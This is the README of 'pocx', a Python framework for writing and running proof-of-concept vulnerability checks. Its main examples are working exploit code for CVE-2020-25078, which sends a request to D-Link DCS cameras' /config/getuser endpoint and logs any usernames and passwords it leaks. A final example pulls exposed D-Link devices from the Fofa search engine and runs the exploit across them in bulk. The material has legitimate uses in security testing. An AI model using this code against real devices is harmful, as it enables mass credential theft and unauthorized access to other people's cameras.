# pocx
A Simple, Fast and Powerful poc engine tools was built by antx, which support synchronous mode and asynchronous mode.
## Install

```bash
pip3 install pocx
```

## Usage

### POC Template

```python
# Title: xxxxxxx
# Author: antx
# Email: wkaifeng2007@163.com
# CVE: CVE-xxxx-xxxxx

from pocx import BasicPoc, AioPoc

class POC(BasicPoc):
    def __init__(self):
        self.name = 'poc'
        super(POC, self).__init__()

    def poc(self, target):
        your poc code here.


if __name__ == '__main__':
    target = 'http://127.0.0.1'
    cve = POC()
    cve.run(target)
```

### Synchronous Mode Example

```python
# Title: D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078
# Author: antx
# Email: wkaifeng2007@163.com
# CVE: CVE-2020-25078

from pocx import BasicPoc
from loguru import logger

class DLinkPoc(BasicPoc):
    @logger.catch(level='ERROR')
    def __init__(self):
        self.name = 'D_Link-DCS-2530L'
        super(DLinkPoc, self).__init__()

    @logger.catch(level='ERROR')
    def poc(self, target: str):
        poc_url = '/config/getuser?index=0'
        try:
            resp = self.get(target + poc_url)
            if resp.status_code == 200 and 'name' in resp.text and 'pass' in resp.text:
                logger.success(resp.text)
            elif resp.status_code == 500:
                logger.error(f'[-] {target} {resp.status_code}')
        except Exception as e:
            logger.error(f'[-] {target} {e}')

if __name__ == '__main__':
    target = 'http://127.0.0.1'
    cve = DLinkPoc()
    cve.run(target)
```

### Asynchronous Mode Example

```python
# Title: D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078
# Author: antx
# Email: wkaifeng2007@163.com
# CVE: CVE-2020-25078

from pocx import AioPoc
from loguru import logger

class DLinkPoc(AioPoc):
    @logger.catch(level='ERROR')
    def __init__(self):
        self.name = 'D_Link-DCS-2530L'
        super(DLinkPoc, self).__init__()

    @logger.catch(level='ERROR')
    async def poc(self, target: str):
        poc_url = '/config/getuser?index=0'
        try:
            resp = await self.aio_get(target + poc_url)
            if resp.status_code == 200 and 'name' in resp.text and 'pass' in resp.text:
                logger.success(resp.text)
            elif resp.status_code == 500:
                logger.error(f'[-] {target} {resp.status_code}')
        except Exception as e:
            logger.error(f'[-] {target} {e}')

if __name__ == '__main__':
    target = 'http://127.0.0.1'
    cve = DLinkPoc()
    cve.run(target)
```

### Useful Functions

```python
# Title: xxxxxxx
# Author: antx
# Email: wkaifeng2007@163.com
# CVE: CVE-xxxx-xxxxx

from pocx import BasicPoc, AioPoc
from pocx.funcs import Fofa

class POC(BasicPoc):
    def __init__(self):
        self.name = 'poc'
        super(POC, self).__init__()

    def poc(self, target):
        your poc code here.

    def assets(self, grammar: str):
        fofa = Fofa()
        fofa.set_config(api_key='xxxxx', api_email='xxxxx')  
        assets = fofa.assets(grammar)
        result = []
        for asset in assets:
            target = f'https://{asset[1]}:{asset[2]}' if int(asset[2]) == 443 else f'http://{asset[1]}:{asset[2]}'
            result.append(target)
        return result

if __name__ == '__main__':
    grammar = 'app="D_Link-DCS-2530L"'
    cve = POC()
    result = cve.assets(grammar)
    cve.run(result)
```
